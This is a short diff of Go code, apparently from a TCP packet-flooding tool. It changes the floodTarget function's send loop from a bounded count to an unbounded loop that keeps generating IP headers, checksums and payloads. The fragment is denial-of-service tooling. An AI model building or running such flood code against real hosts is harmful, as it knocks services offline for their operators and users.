@@ -32,8 +32,8 @@ func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value) {
 		Port: int(tcp.DstPort),
 		Addr: dest,
 	}
-	var sent uint = 0
-	for sent = 0; sent < tcp.SendMax; sent++ {
+
+	for {
 		tcp.genIP()
 		tcp.calcTCPChecksum()
 		tcp.buildPayload(rType, rVal)
